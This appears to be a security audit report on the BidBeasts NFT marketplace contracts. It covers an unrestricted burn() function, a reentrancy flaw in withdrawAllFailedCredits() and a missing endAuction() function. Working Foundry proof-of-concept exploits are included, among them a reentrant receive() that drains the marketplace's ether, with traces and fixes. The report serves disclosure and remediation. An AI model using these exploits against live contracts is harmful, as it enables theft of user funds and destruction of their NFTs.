# Bid Beasts
- Scope
    - BidBeasts_NFT_ERC721.sol
    - BidBeastsNFTMarketPlace.sol
- Findings
    - High: 2  
    [H-01: Anyone can call `BidBeast_NFT_ERC721.sol::burn()` and burn other user's NFT](#high-01)  
    [H-02: Wrong logic in `BidBeast_NFT_ERC721.sol::withdrawAllFailedCredits()` allows reentrancy attack and drain marketplace contract funds](#high-02)   
    - Low: 1  
    [L-01: Missing `endAuction()` function as intented in contest details](#low-01)  
    
- Tools
    - [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## <a id="high-01"></a>H-01: Anyone can call `BidBeast_NFT_ERC721.sol::burn()` and burn other user's NFT

### Summary
`BidBeast_NFT_ERC721.sol::burn()` does not verify if the caller is the owner of the NFT, and allows anyone to burn other user's NFT.

### Vulnerability Details
```
function burn(uint256 _tokenId) public {
    _burn(_tokenId);
    emit BidBeastsBurn(msg.sender, _tokenId);
}
```

### Impact/Proof of Concept
```
function test_anyoneCanBurnOtherUserNFT() public {
    // Owner mints NFT to seller
    vm.startPrank(OWNER);
    uint256 new_token_id = nft.mint(SELLER);
    vm.stopPrank();
    vm.assertEq(nft.ownerOf(new_token_id), SELLER, "SELLER IS NOT OWNER OF NFT");
    
    // Assuming another user (who is not owner of NFT)
    vm.startPrank(BIDDER_1);
    nft.burn(new_token_id);
    vm.stopPrank();
    
    // We should expect a revert when we call ownerOf, as NFT is burned and it should be non existent
    vm.expectRevert("ERC721NonexistentToken(0)");
    console.log(nft.ownerOf(new_token_id));
}
```
Results
```diff
[PASS] test_anyoneCanBurnOtherUserNFT() (gas: 76730)
Logs:
  0x0000000000000000000000000000000000000000

Traces:
  [101178] BidBeastsNFTMarketTest::test_anyoneCanBurnOtherUserNFT()
    ├─ [0] VM::startPrank(ECRecover: [0x0000000000000000000000000000000000000001])
    │   └─ ← [Return]
    ├─ [74067] BidBeasts::mint(SHA-256: [0x0000000000000000000000000000000000000002])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 0)
    │   ├─ emit BidBeastsMinted(to: SHA-256: [0x0000000000000000000000000000000000000002], tokenId: 0)
    │   └─ ← [Return] 0
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [1094] BidBeasts::ownerOf(0) [staticcall]
    │   └─ ← [Return] SHA-256: [0x0000000000000000000000000000000000000002]
    ├─ [0] VM::assertEq(SHA-256: [0x0000000000000000000000000000000000000002], SHA-256: [0x0000000000000000000000000000000000000002], "SELLER IS NOT OWNER OF NFT") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::startPrank(RIPEMD-160: [0x0000000000000000000000000000000000000003])
    │   └─ ← [Return]
    ├─ [7552] BidBeasts::burn(0)
    │   ├─ emit Transfer(from: SHA-256: [0x0000000000000000000000000000000000000002], to: 0x0000000000000000000000000000000000000000, tokenId: 0)
    │   ├─ emit BidBeastsBurn(from: RIPEMD-160: [0x0000000000000000000000000000000000000003], tokenId: 0)
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  ERC721NonexistentToken(0))
    │   └─ ← [Return]
    ├─ [1017] BidBeasts::ownerOf(0) [staticcall]
    │   └─ ← [Revert] ERC721NonexistentToken(0)
    ├─ [0] console::log(0x0000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.02ms (632.10µs CPU time)

Ran 1 test suite in 6.90ms (2.02ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
### Recommendations
Add a check to ensure that the caller of `BidBeast_NFT_ERC721.sol::burn()` is the owner of the NFT.
```diff
function burn(uint256 _tokenId) public {
+    require(_ownerOf(_tokenId) == msg.sender, "Not owner");
    _burn(_tokenId);
    emit BidBeastsBurn(msg.sender, _tokenId);
}
```

## <a id="high-02"></a>H-02: Wrong logic in `BidBeast_NFT_ERC721.sol::withdrawAllFailedCredits()` allows reentrancy attack and drain marketplace contract funds

### Summary
`BidBeast_NFT_ERC721.sol::withdrawAllFailedCredits()` uses the amount of `_receiver` and sets the failedTransferCredits of `msg.sender` to 0. This allows a user to keep withdrawing another user's credit causing reentrancy attack and to drain the funds in this marketplace contract.

### Vulnerability Details
```
function withdrawAllFailedCredits(address _receiver) external {
    uint256 amount = failedTransferCredits[_receiver];
    require(amount > 0, "No credits to withdraw");
    
    failedTransferCredits[msg.sender] = 0;
    
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Withdraw failed");
}
```

### Impact/Proof of Concept
Add this helper function in `BidBeastsNFTMarketPlace.sol` to simulate a user having failed credits
```
// Helper functions //
function addFailedCredits(address user, uint256 amount) external {
    failedTransferCredits[user] += amount;
}
```

Add this to test contract
```
function test_withdrawAllFailedCreditAllowsUserToDrainFunds() public {
    // Simulate funds inside contract
    vm.deal(address(market), 5 ether);
    vm.assertEq(address(market).balance, 5 ether, "Market balance should be 5 ether");

    // Create helper function to simulate BIDDER_1 with failed credits
    market.addFailedCredits(BIDDER_1, 1 ether);
    
    uint256 thisBalanceBefore = address(this).balance;
    // Before balances
    console.log('market before: ', address(market).balance/1e18);
    console.log('this before: ', thisBalanceBefore/1e18);

    // Assume this contract's role and withdraw BIDDER_1 credits, draining the marketplace contract funds
    vm.startPrank(address(this));
    market.withdrawAllFailedCredits(BIDDER_1);
    vm.stopPrank();
    vm.assertEq(address(market).balance, 0, "Market balance should have 0 funds");
    vm.assertEq(address(this).balance, thisBalanceBefore + 5 ether, "This should have 5 ether");

    // After balances
    console.log('market after: ', address(market).balance/1e18);
    console.log('this after: ', address(this).balance/1e18);
}

receive() external payable {
    // Reentrancy attack
    if(address(market).balance/1e18 > 0){
        vm.startPrank(address(this));
        market.withdrawAllFailedCredits(BIDDER_1);
        vm.stopPrank();
    }
}
```
Results
```diff
Ran 1 test for test/BidBeastsMarketPlaceTest.t.sol:BidBeastsNFTMarketTest
[PASS] test_withdrawAllFailedCreditAllowsUserToDrainFunds() (gas: 93757)
Logs:
  market before:  5
  this before:  79228162514
  market after:  0
  this after:  79228162519

Traces:
  [93757] BidBeastsNFTMarketTest::test_withdrawAllFailedCreditAllowsUserToDrainFunds()
    ├─ [0] VM::deal(BidBeastsNFTMarket: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 5000000000000000000 [5e18])
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(5000000000000000000 [5e18], 5000000000000000000 [5e18], "Market balance should be 5 ether") [staticcall]
    │   └─ ← [Return]
    ├─ [23064] BidBeastsNFTMarket::addFailedCredits(RIPEMD-160: [0x0000000000000000000000000000000000000003], 1000000000000000000 [1e18])
    │   └─ ← [Stop]
    ├─ [0] console::log("market before: ", 5) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("this before: ", 79228162514 [7.922e10]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::startPrank(BidBeastsNFTMarketTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Return]
    ├─ [51264] BidBeastsNFTMarket::withdrawAllFailedCredits(RIPEMD-160: [0x0000000000000000000000000000000000000003])
    │   ├─ [41146] BidBeastsNFTMarketTest::receive{value: 1000000000000000000}()
    │   │   ├─ [0] VM::startPrank(BidBeastsNFTMarketTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   └─ ← [Return]
    │   │   ├─ [39015] BidBeastsNFTMarket::withdrawAllFailedCredits(RIPEMD-160: [0x0000000000000000000000000000000000000003])
    │   │   │   ├─ [30997] BidBeastsNFTMarketTest::receive{value: 1000000000000000000}()
    │   │   │   │   ├─ [0] VM::startPrank(BidBeastsNFTMarketTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   ├─ [28866] BidBeastsNFTMarket::withdrawAllFailedCredits(RIPEMD-160: [0x0000000000000000000000000000000000000003])
    │   │   │   │   │   ├─ [20848] BidBeastsNFTMarketTest::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   ├─ [0] VM::startPrank(BidBeastsNFTMarketTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   ├─ [18717] BidBeastsNFTMarket::withdrawAllFailedCredits(RIPEMD-160: [0x0000000000000000000000000000000000000003])
    │   │   │   │   │   │   │   ├─ [10699] BidBeastsNFTMarketTest::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   ├─ [0] VM::startPrank(BidBeastsNFTMarketTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   │   │   ├─ [8568] BidBeastsNFTMarket::withdrawAllFailedCredits(RIPEMD-160: [0x0000000000000000000000000000000000000003])
    │   │   │   │   │   │   │   │   │   ├─ [550] BidBeastsNFTMarketTest::receive{value: 1000000000000000000}()
    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   ├─ [0] VM::stopPrank()
    │   │   │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   ├─ [0] VM::stopPrank()
    │   │   │   │   │   │   │   └─ ← [Return]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [0] VM::stopPrank()
    │   │   │   │   │   └─ ← [Return]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Stop]
    │   │   ├─ [0] VM::stopPrank()
    │   │   │   └─ ← [Return]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(0, 0, "Market balance should have 0 funds") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertEq(79228162519264337593543950335 [7.922e28], 79228162519264337593543950335 [7.922e28], "This should have 5 ether") [staticcall]
    │   └─ ← [Return]
    ├─ [0] console::log("market after: ", 0) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] console::log("this after: ", 79228162519 [7.922e10]) [staticcall]
    │   └─ ← [Stop]
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.01ms (407.10µs CPU time)

Ran 1 test suite in 4.90ms (1.01ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
### Recommendations
Change the function to only allow a user to withdraw their own funds.
```diff
- function withdrawAllFailedCredits(address _receiver) external {
+ function withdrawAllFailedCredits() external {    
-    uint256 amount = failedTransferCredits[_receiver];
+    uint256 amount = failedTransferCredits[msg.sender];
    require(amount > 0, "No credits to withdraw");
    
    failedTransferCredits[msg.sender] = 0;
    
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "Withdraw failed");
}
```

## <a id="low-01"></a>L-01: Missing `endAuction()` function as intented in contest details

### Summary
As stated in the contest details, the contract is missing `endAuction()` function that allows anyone to call and finalize the auction after 3 days. The current implementation is:
1. Seller can unlist NFT at **anytime** if no bids have been placed
2. Auction ends **15mins after a bid is placed (instead of 3days)** and anyone can settle/end the auction.


### Vulnerability Details
```diff
## The flow is simple:
1. **Listing**:
   * NFT owners call `listNFT(tokenId, minPrice)` to list their token.
   * The NFT is transferred from the seller to the marketplace contract.

2. **Bidding**:
   * Users call `placeBid(tokenId)` and send ETH to place a bid.
   * New bids must be higher than the previous bid.
   * Previous bidders are refunded automatically.

3. **Auction Completion**:
+   * After 3 days, anyone can call `endAuction(tokenId)` to finalize the auction.
   * If the highest bid meets or exceeds the minimum price:
     * NFT is transferred to the winning bidder.
     * Seller receives payment minus a 5% marketplace fee.
   * If no valid bids were made:
     * NFT is returned to the original seller.

4. **Fee Withdrawal**:
   * Contract owner can withdraw accumulated fees using `withdrawFee()`.
```

### Impact/Proof of Concept
```
1. Auction can end before 3 days, if a bid has been placed.
2. Seller can choose to unlist NFT anytime if no bids has been placed.
```

### Recommendations
Add `endAuction()` function that allows anyone to call and end the auction after 3 days.